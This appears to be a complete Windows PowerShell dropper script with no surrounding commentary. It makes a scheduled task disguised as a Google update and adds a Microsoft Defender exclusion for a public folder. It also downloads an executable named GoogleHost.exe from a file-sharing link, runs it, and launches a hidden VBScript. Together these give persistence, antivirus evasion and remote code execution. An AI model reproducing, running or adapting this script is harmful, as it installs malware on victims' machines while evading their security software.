
mkdir C:\Users\Public\Programs
curl.exe -o $env:temp/temp.xml "https://raw.githubusercontent.com/p0k0r0k0/certs/refs/heads/main/temp.xml"
schtasks /Create /tn GoogleUpdateCore /xml $env:temp/temp.xml
Add-MpPreference -ExclusionPath C:\Users\Public\Programs\
curl.exe -o C:\Users\Public\Programs\GoogleHost.exe "https://file.io/Jc3XnbT7Geqk"
start C:\Users\Public\Programs\GoogleHost.exe
cd $env:temp
start hide.vbs
exit
